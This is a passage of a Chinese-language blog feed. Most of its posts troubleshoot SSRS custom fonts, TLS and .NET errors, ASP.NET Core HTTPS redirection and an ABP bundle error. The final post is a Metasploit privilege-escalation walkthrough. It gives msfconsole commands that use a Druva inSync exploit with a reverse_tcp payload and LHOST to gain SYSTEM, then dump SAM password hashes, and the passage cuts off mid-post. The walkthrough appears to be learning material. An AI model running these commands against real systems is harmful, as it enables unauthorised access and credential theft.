class="keyword">if</span> (node.nodeType === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.dispose &amp;&amp; <span class="keyword">typeof</span> node.dispose === <span class="string">"function"</span>) &#123;</span></span><br><span class="line"><span class="undefined">              node.dispose();</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span></span><br><span class="line"><span class="undefined">              node.control &amp;&amp;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">typeof</span> node.control.dispose === <span class="string">"function"</span></span></span><br><span class="line"><span class="undefined">            ) &#123;</span></span><br><span class="line"><span class="undefined">              node.control.dispose();</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> behaviors = node._behaviors;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (behaviors) &#123;</span></span><br><span class="line"><span class="javascript">              behaviors = <span class="built_in">Array</span>.apply(<span class="literal">null</span>, behaviors);</span></span><br><span class="line"><span class="javascript">              <span class="keyword">for</span> (<span class="keyword">var</span> k = behaviors.length - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--) &#123;</span></span><br><span class="line"><span class="undefined">                behaviors[k].dispose();</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">      @<span class="keyword">font-face</span> &#123;</span></span><br><span class="line"><span class="undefined">        font-family: EUDC;</span></span><br><span class="line"><span class="undefined">        src: url("./fonts/RM.woff?v=1.0.0");</span></span><br><span class="line"><span class="undefined">        src: url("./fonts/RM.woff?v=1.0.0") format("woff"), url("./fonts/RM.ttf?v=1.0.0")</span></span><br><span class="line"><span class="undefined">            format("truetype");</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      * &#123;</span></span><br><span class="line"><span class="undefined">        font-family: "EUDC";</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.透過 Chrome F12 中的 Network(網路) 來查看 woff 及 ttf 是否有下載<br><img src="/2022/10/28/ms-reporting-service-add-custom-font-woff-ttf/01.png" title="download woff"></p><p>*註: 如果出現 404，請檢查 檔名，或是 URL 路徑是否正確。</p><p>5.檢查網頁字型是否有套用到我們設定的 font-family<br><img src="/2022/10/28/ms-reporting-service-add-custom-font-woff-ttf/02.png" title="font-family"></p><p>到這裡，如果有套用到，而字型檔又有正常下載，自造字通常會顯示出來的。<br>但在 SSRS 中，卻沒有正常顯示，還是一個空白框。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>css style 沒問題，字型檔又沒 404，到底是那裡出錯呢?<br>於是在 C:\Program Files\Microsoft SQL Server\MSRSxx.MSSQLSERVER\Reporting Services\ReportServer\Pages 目錄中，新增一支 f.html 檔案來測試看看，結果在 URL 上輸入 f.html ，出現的居然是 目錄瀏覽。 改成 f.aspx ，再瀏覽一次，出來的結果還是 目錄瀏覽。</p><p>於是將 URL 改成 woff 的路徑，結果還是 目錄瀏覽的內容。<br>難怪自造字不會呈現，因為跟本就沒有下載到 Client 端。</p><p>於是將字型檔 Fonts 目錄搬到 IIS 根目錄去，將 style url 改參考自 IIS 根目錄的字型檔，<br>自造字(EUDC)在 SSRS 報表中，就可以正常的被 Preview 了。<br>最後的 ReportViewer.aspx 如下(把 ./fonts =&gt; /font ),</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">Register</span> <span class="attr">TagPrefix</span>=<span class="string">"RS"</span> <span class="attr">Namespace</span>=<span class="string">"Microsoft.ReportingServices.WebServer"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Assembly</span>=<span class="string">"ReportingServicesWebServer"</span> %&gt;</span> <span class="tag">&lt;<span class="name">%@</span> <span class="attr">Page</span> <span class="attr">Language</span>=<span class="string">"C#"</span></span></span><br><span class="line"><span class="tag"><span class="attr">AutoEventWireup</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag"><span class="attr">Inherits</span>=<span class="string">"Microsoft.ReportingServices.WebServer.ReportViewerPage"</span></span></span><br><span class="line"><span class="tag"><span class="attr">EnableEventValidation</span>=<span class="string">"false"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asp:literal</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"docType"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:literal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">id</span>=<span class="string">"headID"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">asp:literal</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"httpEquiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">asp:literal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>***<span class="tag">&lt;<span class="name">%=</span> <span class="attr">GetPageTitle</span>() %&gt;</span>***<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">"margin: 0px; overflow: auto"</span> <span class="attr">f</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">id</span>=<span class="string">"ReportViewerForm"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">asp:ScriptManager</span></span></span><br><span class="line"><span class="tag">        <span class="attr">ID</span>=<span class="string">"AjaxScriptManager"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">AsyncPostBackTimeout</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">runat</span>=<span class="string">"server"</span></span></span><br><span class="line"><span class="tag">      /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">RS:ReportViewerHost</span> <span class="attr">ID</span>=<span class="string">"ReportViewerControl"</span> <span class="attr">runat</span>=<span class="string">"server"</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      Sys.WebForms.PageRequestManager.prototype._destroyTree = <span class="function"><span class="keyword">function</span> (<span class="params"></span></span></span></span><br><span class="line"><span class="undefined">        element</span></span><br><span class="line"><span class="undefined">      ) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allnodes = element.getElementsByTagName(<span class="string">"*"</span>),</span></span><br><span class="line"><span class="undefined">          length = allnodes.length;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> nodes = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; length; k++) &#123;</span></span><br><span class="line"><span class="undefined">          nodes[k] = allnodes[k];</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, l = nodes.length; j &lt; l; j++) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> node = nodes[j];</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (node.nodeType === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (node.dispose &amp;&amp; <span class="keyword">typeof</span> node.dispose === <span class="string">"function"</span>) &#123;</span></span><br><span class="line"><span class="undefined">              node.dispose();</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (</span></span><br><span class="line"><span class="undefined">              node.control &amp;&amp;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">typeof</span> node.control.dispose === <span class="string">"function"</span></span></span><br><span class="line"><span class="undefined">            ) &#123;</span></span><br><span class="line"><span class="undefined">              node.control.dispose();</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> behaviors = node._behaviors;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (behaviors) &#123;</span></span><br><span class="line"><span class="javascript">              behaviors = <span class="built_in">Array</span>.apply(<span class="literal">null</span>, behaviors);</span></span><br><span class="line"><span class="javascript">              <span class="keyword">for</span> (<span class="keyword">var</span> k = behaviors.length - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--) &#123;</span></span><br><span class="line"><span class="undefined">                behaviors[k].dispose();</span></span><br><span class="line"><span class="undefined">              &#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">      @<span class="keyword">font-face</span> &#123;</span></span><br><span class="line"><span class="undefined">        font-family: EUDC;</span></span><br><span class="line"><span class="undefined">        src: url("/fonts/RM.woff?v=1.0.0");</span></span><br><span class="line"><span class="undefined">        src: url("/fonts/RM.woff?v=1.0.0") format("woff"), url("/fonts/RM.ttf?v=1.0.0")</span></span><br><span class="line"><span class="undefined">            format("truetype");</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      * &#123;</span></span><br><span class="line"><span class="undefined">        font-family: "EUDC";</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2022/10/28/ms-reporting-service-add-custom-font-woff-ttf/03.png" title="font-family well"><p>*註:當然您也可放在別的 URL，只要可以正常被下載到就可以了。</p><p>*註: 如何將 使用者自造字(EUDC) 轉成 woff 及 ttf ，可以參考 <a href="https://dotblogs.com.tw/rainmaker/2016/03/09/232711" target="_blank" rel="noopener">Font-讓瀏覽器顯示使用者自造字(EUDC)的方式</a></p><blockquote><p>fontforge api SetFontNames(fontname[, family[, fullname[, weight[, copyright-notice[, fontversion]]]]])<br>所以在 <a href="https://dotblogs.com.tw/rainmaker/2016/03/09/232711" target="_blank" rel="noopener">Font-讓瀏覽器顯示使用者自造字(EUDC)的方式</a> script 中的 copyright-notice ，我設定成本公司的代號 655 ^_^</p></blockquote><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://dotblogs.com.tw/rainmaker/2016/03/09/232711" target="_blank" rel="noopener">Font-讓瀏覽器顯示使用者自造字(EUDC)的方式</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;最近客戶要在 Chrome 上開啟 Reporting Services 的報表，&lt;br&gt;但因為客戶的資料裡面有自造字(EUDC)，&lt;br&gt;
      
    
    </summary>
    
    
      <category term="自造字" scheme="https://rainmakerho.github.io/tags/%E8%87%AA%E9%80%A0%E5%AD%97/"/>
    
      <category term="空白框" scheme="https://rainmakerho.github.io/tags/%E7%A9%BA%E7%99%BD%E6%A1%86/"/>
    
      <category term="EUDC" scheme="https://rainmakerho.github.io/tags/EUDC/"/>
    
      <category term="SSRS" scheme="https://rainmakerho.github.io/tags/SSRS/"/>
    
      <category term="woff" scheme="https://rainmakerho.github.io/tags/woff/"/>
    
      <category term="ttf" scheme="https://rainmakerho.github.io/tags/ttf/"/>
    
  </entry>
  
  <entry>
    <title>當 SQL Server 將 TLS 1.0/1.1 關掉之後的怪現象 - SSL 安全性錯誤 (pre-login handshake)</title>
    <link href="https://rainmakerho.github.io/2022/10/20/ado-pre-login-handshake-tcp-provider-error-0/"/>
    <id>https://rainmakerho.github.io/2022/10/20/ado-pre-login-handshake-tcp-provider-error-0/</id>
    <published>2022-10-20T00:35:46.000Z</published>
    <updated>2022-10-21T01:13:37.791Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>發生問題的環境是 DB Server 為 MS SQL 2014, Client 為 Windows 10, 應用程式為 .NET 1.1 Windows Form Application。當透過 IIS Crypto 關掉 TLS 1.0/1.1 後，有些 Windows 10 Client 執行程式時，就會發生 <b>System.Data.SqlClient.ConnectionPool.GetConnection &lt;System.Data.SqlClient.SqlException&gt; SSL 安全性錯誤</b> 的錯誤。</p><h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><p>程式是沒有走 TLS 去連接 MS SQL，但卻發生 SSL 的錯誤，而且在 Server 上的 SQL Server Configuration Manager 工具中 SQL Server 網路組態中的 MSSQLSERVER 的通訊協定 TCP/IP 中，<br>「強制加密」屬性是設定成 <strong>否</strong>，如下圖。為什麼應用程式會變成要走 TLS 呢?<br><img src="/2022/10/20/ado-pre-login-handshake-tcp-provider-error-0/01.png" title="強制加密"></p><p>在 Client 端透過 ODBC 去連 SQL 又都是成功的，透過 SSMS 工具去連接，沒勾選「加密連接(Y)」也是可以連線的，勾選「加密連接(Y)」反而有憑證錯誤的問題，如下圖，<br><img src="/2022/10/20/ado-pre-login-handshake-tcp-provider-error-0/02.png" title="不受信任的授權單位發出的"></p><p>後來同事 Hihi 使用自已的 Win 10 執行程式卻是沒問題的。<br>這樣似乎跟我們程式中自動安裝 .NET 1.1 有關係，<br>於是將 .NET 1.1 移除後，再進行測試，卻是出現了 <strong>pre-login handshake. provider: TCP Provider</strong> 的錯誤，</p><blockquote><p>A connection was successfully established with the server, but then an error occurred during the pre-login handshake. (provider: TCP Provider, error: 0 - 遠端主機已強制關閉一個現存的連線。)</p></blockquote><p>這個錯誤在網路上似乎是因為 .NET 2.X 對 TLS 1.2 Support 的問題，所以要更新 .NET 3.5 。<br>後來同事從 Windows 10 image 中安裝 .NET 3.5 後，重開機，再執行程式就正常了。<br>以下記錄 System.Data.dll 的版本來比較一下，<br>有問題的版本號是 <strong>2.0.50727.8662</strong> ，<br>安裝 Windows 10 CD 中 .NET 3.5 後的版本號為 <strong>2.0.50727.9149</strong></p><p>所以我們後來的解法就是不安裝我們系統提供的 .NET 1.1 (這樣程式就會使用 .NET 2.X 的 Lib (Maybe))，<br>再安裝 Windows 10 CD 中的 .NET 3.5 ，就沒問題了。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://blog.darkthread.net/blog/disable-tls-1-0-issues/" target="_blank" rel="noopener">Windows 停用 TLS 1.0 之配套作業整理</a><br><a href="http://w-type.blogspot.com/2019/04/net-framework-35-0x800f081f.html" target="_blank" rel="noopener">安裝 Net Framework 3.5 卻出現錯誤代碼 0x800F081F</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;發生問題的環境是 DB Server 為 MS SQL 2014, Client 為 Windows 10, 應用程式為 .NET 1.1 
      
    
    </summary>
    
    
      <category term=".NET 1.1" scheme="https://rainmakerho.github.io/tags/NET-1-1/"/>
    
      <category term="ADO.NET" scheme="https://rainmakerho.github.io/tags/ADO-NET/"/>
    
      <category term="pre-login handshake" scheme="https://rainmakerho.github.io/tags/pre-login-handshake/"/>
    
      <category term="TCP Provider" scheme="https://rainmakerho.github.io/tags/TCP-Provider/"/>
    
  </entry>
  
  <entry>
    <title>使用 app.UseHttpsRedirection() 不會強制轉 HTTPS ?</title>
    <link href="https://rainmakerho.github.io/2022/09/21/UseHttpsRedirection-not-redirect-https/"/>
    <id>https://rainmakerho.github.io/2022/09/21/UseHttpsRedirection-not-redirect-https/</id>
    <published>2022-09-21T09:26:45.000Z</published>
    <updated>2022-09-21T09:38:21.175Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>同事在測試 ASP.NET Core Web 系統時，原本可以在 http 正常運作。<br>今天輸入 http 後，居然自動導到了 https 。<br>因為程式中有寫 <code>app.UseHttpsRedirection()</code> ，所以會把 http 轉到 https。<br>可是同事說，之前走 http 都可以，為什麼今天卻不OK了呢?</p><h3 id="釐清狀況"><a href="#釐清狀況" class="headerlink" title="釐清狀況"></a>釐清狀況</h3><p>最近有到 IIS 新增 https 繫結，而 <code>app.UseHttpsRedirection()</code> 會檢查如果 https 可以走的話，就會走 https。<br>之前可以是因為 IIS 上只有 http 繫結，並不能走 https ，所以 <strong>不會強制走到 https</strong>。</p><h3 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h3><p><a href="https://github.com/aspnet/Announcements/issues/301" target="_blank" rel="noopener">HttpsRedirectionMiddleware will not redirect to HTTPS if no port is available</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;同事在測試 ASP.NET Core Web 系統時，原本可以在 http 正常運作。&lt;br&gt;今天輸入 http 後，居然自動導到了 htt
      
    
    </summary>
    
    
      <category term="IIS" scheme="https://rainmakerho.github.io/tags/IIS/"/>
    
      <category term="app.UseHttpsRedirection" scheme="https://rainmakerho.github.io/tags/app-UseHttpsRedirection/"/>
    
      <category term="HttpsPort" scheme="https://rainmakerho.github.io/tags/HttpsPort/"/>
    
  </entry>
  
  <entry>
    <title>Could not find the bundle file &#39;/libs/abp/core/abp.css&#39; for the bundle &#39;Basic.Global&#39;!</title>
    <link href="https://rainmakerho.github.io/2022/09/12/abp-not-find-bundle-libs-abp-core-abp-css-Basic-Global/"/>
    <id>https://rainmakerho.github.io/2022/09/12/abp-not-find-bundle-libs-abp-core-abp-css-Basic-Global/</id>
    <published>2022-09-12T08:55:47.000Z</published>
    <updated>2022-09-12T09:31:11.295Z</updated>
    
    <content type="html"><![CDATA[<h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>從 <a href="https://abp.io/get-started" target="_blank" rel="noopener">abp.io/get-started</a> 設定 UI Framework 為 MVC (Razor Pages) or Blazor Server UI，下載 Source 後，<br>透過 Visual Studio 建置執行後，會出現 <strong>Volo.Abp.AbpException: Could not find the bundle file ‘/libs/abp/core/abp.css’ for the bundle ‘Basic.Global’!</strong> 的錯誤</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>依 <a href="https://blog.abp.io/abp/ABP.IO-Platform-5-2-RC-Has-Been-Published" target="_blank" rel="noopener">ABP.IO Platform 5.2 RC Has Been Published</a> 說明如下，</p><blockquote><p>With version 5.2, this folder is excluded from the source control by default, so every developer getting the solution must run abp install-libs in the UI project’s root directory to install these libraries.<br>所以當從 <a href="https://abp.io/get-started" target="_blank" rel="noopener">abp.io/get-started</a> 下載 Source 後，要在 UI 專案根目錄執行 <code>abp install-libs</code>，就會在 wwwroot 目錄中產生 libs 目錄。</p></blockquote><p>如果透過 apb cli 去建立專案，則會自動執行 <code>abp install-libs</code> ，所以建立完成後，UI 專案中的 wwwroot 目錄中就會有 <strong>libs</strong> 的目錄。</p><p>所以如果噴 <strong>Volo.Abp.AbpException: Could not find the bundle file ‘/libs/abp/core/abp.css’ for the bundle ‘Basic.Global’!</strong> 的錯誤，在 UI 專案根目錄執行 <code>abp install-libs</code> ，或是從別的專案中，將 libs 目錄 Copy 到需要的專案 wwwroot 目錄之中。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://support.abp.io/QA/Questions/2715/AbpException-Could-not-find-the-bundle-file-%27libsabpcoreabpcss%27-for-the-bundle-%27BasicGlobal%27" target="_blank" rel="noopener">AbpException: Could not find the bundle file ‘/libs/abp/core/abp.css’ for the bundle ‘Basic.Global’!</a><br><a href="https://blog.abp.io/abp/ABP.IO-Platform-5-2-RC-Has-Been-Published" target="_blank" rel="noopener">ABP.IO Platform 5.2 RC Has Been Published</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;問題&quot;&gt;&lt;a href=&quot;#問題&quot; class=&quot;headerlink&quot; title=&quot;問題&quot;&gt;&lt;/a&gt;問題&lt;/h3&gt;&lt;p&gt;從 &lt;a href=&quot;https://abp.io/get-started&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
      
    
    </summary>
    
    
      <category term="Abp" scheme="https://rainmakerho.github.io/tags/Abp/"/>
    
      <category term="/libs/abp/core/abp.css" scheme="https://rainmakerho.github.io/tags/libs-abp-core-abp-css/"/>
    
      <category term="Basic.Global" scheme="https://rainmakerho.github.io/tags/Basic-Global/"/>
    
      <category term="install-libs" scheme="https://rainmakerho.github.io/tags/install-libs/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit 提權</title>
    <link href="https://rainmakerho.github.io/2022/08/31/metasploit-privilege-escalation/"/>
    <id>https://rainmakerho.github.io/2022/08/31/metasploit-privilege-escalation/</id>
    <published>2022-08-31T08:31:29.000Z</published>
    <updated>2022-09-01T02:14:41.391Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>成功透過 Metasploit 建立 meterpreter session 時，可以透過 <code>hashdump</code> 將 Security Accounts Manager (SAM) 資料 dump 出來，但如果使用者的權限不足，這時就需要提升權限。<br>可以透過 metasploit Suggester 來掃看看受害電腦可能有那些被提權的攻擊模組，<br>或是查看有那些有漏洞的 Service 可以讓我們以它的身份建立 meterpreter session。</p><h3 id="透過-metasploit-Suggester"><a href="#透過-metasploit-Suggester" class="headerlink" title="透過 metasploit Suggester"></a>透過 metasploit Suggester</h3><p>1.當已建立好 session 後，<code>bg</code>，回到 <code>msfconsole</code>，輸入 <code>search suggester</code>，然後使用 <strong>post/multi/recon/local_exploit_suggester</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SESSION [你的sessionId]</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-privilege-escalation/01.png" title="use post/multi/recon/local_exploit_suggester"><img src="/2022/08/31/metasploit-privilege-escalation/02.png" title="local_exploit_suggester"><p>2.使用 <strong>local_exploit_suggester</strong> 建議的模組，大多數只需要設定 <strong>SESSION</strong> 參數後，執行 <code>run</code> 即可<br><img src="/2022/08/31/metasploit-privilege-escalation/04.png" title="try suggester1"></p><img src="/2022/08/31/metasploit-privilege-escalation/03.png" title="try suggester"><p>註:如果顯示 <strong>Payload arch must match target arch</strong> 代表目前的 payload 的 arch 不對，因為預設是 x86 ，所以要改以 x64 的 payload ，例如 <code>set payload windows/x64/meterpreter/reverse_tcp</code></p><h3 id="查看有那些有漏洞的-Service"><a href="#查看有那些有漏洞的-Service" class="headerlink" title="查看有那些有漏洞的 Service"></a>查看有那些有漏洞的 Service</h3><p>1.使用 <code>use post/windows/gather/enum_services</code> 來查看有那些 Services<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_services</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SESSION 7</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-privilege-escalation/05.png" title="enum_services"><p>2.發現 Druva 的 inSyncCPHService 似乎有漏洞可利用<br><img src="/2022/08/31/metasploit-privilege-escalation/06.png" title="inSyncCPHService"><br>註: 有問題的 Druva 可以從以下URL 下載 <a href="https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi" target="_blank" rel="noopener">https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi</a></p><p>3.使用 Druva 的攻擊模組來取得 system 權限的 meterpreter session<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search druva</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> LHOST 10.5.0.7</span><br><span class="line"><span class="built_in">set</span> LPORT 1234</span><br><span class="line"><span class="built_in">set</span> SESSION 7</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-privilege-escalation/07.png" title="search druva"> <img src="/2022/08/31/metasploit-privilege-escalation/08.png" title="set druva_insync_insynccphwnet64_rcp_type_5_priv_esc"> <p>　<br><img src="/2022/08/31/metasploit-privilege-escalation/09.png" title="run druva_insync_insynccphwnet64_rcp_type_5_priv_esc"> </p><p>3.成功透過 Service 漏洞取得 System 的 session，下 <code>getuid</code> ，為 system 帳號<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-privilege-escalation/10.png" title="druva getuid"> <p>4.下 <code>ps</code> 來查看受害電腦中的 process, 並下 <code>getpid</code> 來查看目前的 process id，並下<code>hashdump</code>來取得 Security Accounts Manager (SAM) db 的資料<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 